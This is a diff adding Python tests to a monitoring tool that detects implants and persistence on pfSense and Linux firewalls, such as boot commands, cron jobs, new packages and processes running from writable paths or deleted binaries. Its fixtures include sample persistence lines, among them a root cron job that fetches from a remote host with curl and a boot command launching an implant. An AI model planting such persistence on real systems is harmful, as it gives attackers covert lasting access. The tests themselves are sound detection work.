@@ -633,3 +633,149 @@ def test_a_changed_untriaged_item_does_count_as_outstanding(tmp_path: Path) -> N
     assert digest_for(store).unreviewed == 1
     assert digest_for(store).quiet is False
     store.close()
+
+
+# --- persistence on pfSense, and implants anywhere --------------------------
+
+
+PF_PERSISTENCE = """<?xml version="1.0"?>
+<pfsense>
+  <system>
+    <earlyshellcmd>/usr/local/sbin/fwshell</earlyshellcmd>
+  </system>
+  <cron>
+    <item><minute>*/5</minute><hour>*</hour><mday>*</mday><month>*</month>
+      <wday>*</wday><who>root</who><command>/usr/bin/curl http://10.9.9.9/p</command></item>
+  </cron>
+  <installedpackages>
+    <package><name>Shellcmd</name><version>1.0</version></package>
+  </installedpackages>
+</pfsense>
+"""
+
+
+def test_a_command_run_at_boot_is_critical() -> None:
+    """`MONITORING.md` M-BOOT-02 — the persistence favourite on this platform.
+
+    `/tmp` and `/var` are memory-backed on pfSense, so an implant left there dies at the
+    next reboot. What survives is a line in `config.xml`, which is also the file nobody
+    reads by eye.
+    """
+    import xml.etree.ElementTree as ET
+
+    from btht.app.monitor.adapters.pfsense import _boot_commands
+
+    items = _boot_commands(ET.fromstring(PF_PERSISTENCE))
+    early = next(i for i in items if i.collector == "M-BOOT-02")
+    assert early.severity is Severity.CRITICAL
+    assert "fwshell" in early.value
+
+
+def test_a_shellcmd_entry_is_found_wherever_it_sits() -> None:
+    """`M-BOOT-03` — same idea, different element, added by a package."""
+    import xml.etree.ElementTree as ET
+
+    xml = "<pfsense><installedpackages><shellcmdsettings><config>"
+    xml += "<shellcmd>/usr/local/bin/agent</shellcmd>"
+    xml += "</config></shellcmdsettings></installedpackages></pfsense>"
+    from btht.app.monitor.adapters.pfsense import _boot_commands
+
+    items = _boot_commands(ET.fromstring(xml))
+    assert [i.collector for i in items] == ["M-BOOT-03"]
+    assert items[0].severity is Severity.CRITICAL
+
+
+def test_a_stock_config_has_no_boot_commands_at_all() -> None:
+    """The baseline is empty, so any member is worth waking somebody for."""
+    import xml.etree.ElementTree as ET
+
+    from btht.app.monitor.adapters.pfsense import _boot_commands
+
+    assert _boot_commands(ET.fromstring("<pfsense><system/></pfsense>")) == []
+
+
+def test_pfsense_cron_entries_are_collected() -> None:
+    """`M-SCHED-04` — cron on this platform lives in config.xml, not a crontab file."""
+    import xml.etree.ElementTree as ET
+
+    from btht.app.monitor.adapters.pfsense import _cron
+
+    items = _cron(ET.fromstring(PF_PERSISTENCE))
+    assert len(items) == 1
+    assert "curl" in items[0].value
+    assert items[0].severity is Severity.CRITICAL
+
+
+def test_installed_packages_are_collected() -> None:
+    """`M-SVC-04` — a new package is new attack surface, chosen by somebody."""
+    import xml.etree.ElementTree as ET
+
+    from btht.app.monitor.adapters.pfsense import _packages
+
+    assert [i.value for i in _packages(ET.fromstring(PF_PERSISTENCE))] == ["Shellcmd 1.0"]
+
+
+PROC_EXE = """\
+lrwxrwxrwx 1 root root 0 Aug 27 09:00 /proc/1/exe -> /usr/lib/systemd/systemd
+lrwxrwxrwx 1 root root 0 Aug 27 09:00 /proc/902/exe -> /usr/sbin/sshd
+lrwxrwxrwx 1 root root 0 Aug 27 14:31 /proc/4127/exe -> /tmp/fwshell
+lrwxrwxrwx 1 root root 0 Aug 27 14:32 /proc/4200/exe -> /usr/local/bin/agent (deleted)
+"""
+
+
+def test_a_process_running_from_a_writable_path_is_critical() -> None:
+    """`M-SVC-05` — it is running something anybody with a shell could have replaced."""
+    from btht.app.monitor.adapters.linux import _running_from
+
+    items = _running_from(PROC_EXE)
+    writable = [i for i in items if i.collector == "M-SVC-05"]
+    assert len(writable) == 1
+    assert "/tmp/fwshell" in writable[0].value
+    assert writable[0].severity is Severity.CRITICAL
+
+
+def test_a_process_whose_binary_is_gone_is_critical() -> None:
+    """`M-SVC-06` — what a payload does when it unlinks itself after starting.
+
+    On a firewall running a fixed set of services there is no benign explanation.
+    """
+    from btht.app.monitor.adapters.linux import _running_from
+
+    deleted = [i for i in _running_from(PROC_EXE) if i.collector == "M-SVC-06"]
+    assert len(deleted) == 1
+    assert "no longer on disk" in deleted[0].value
+
+
+def test_the_ordinary_processes_produce_nothing() -> None:
+    """systemd and sshd must not appear, or the check gets ignored."""
+    from btht.app.monitor.adapters.linux import _running_from
+
+    assert not [i for i in _running_from(PROC_EXE) if "systemd" in i.value or "sshd" in i.value]
+
+
+def test_implant_checks_report_unknown_when_nothing_was_collected() -> None:
+    """A check that passes because it saw nothing is worse than no check at all."""
+    from btht.app.validate.posture import Result, check_implant
+
+    results = {c.id: c.result for c in check_implant([])}
+    assert set(results.values()) == {Result.UNKNOWN}
+
+
+def test_implant_checks_fail_on_the_observed_chain() -> None:
+    """The whole chain: boot command, deleted binary, writable path, @reboot cron."""
+    from btht.app.validate.posture import Result, check_implant
+
+    items = [
+        Item(key="b", collector="M-BOOT-02", kind=Kind.CONFIG, value="/usr/local/sbin/fwshell"),
+        Item(key="d", collector="M-SVC-06", kind=Kind.CONFIG, value="pid 1 running /x (gone)"),
+        Item(key="w", collector="M-SVC-05", kind=Kind.CONFIG, value="pid 2 running /tmp/a"),
+        Item(
+            key="c",
+            collector="M-SCHED-01",
+            kind=Kind.CONFIG,
+            value="@reboot /usr/local/sbin/fwshell",
+        ),
+    ]
+    results = {c.id: c.result for c in check_implant(items)}
+    for check in ("H-IMP-01", "H-IMP-02", "H-IMP-03", "H-IMP-04"):
+        assert results[check] is Result.FAIL, f"{check} should have fired"
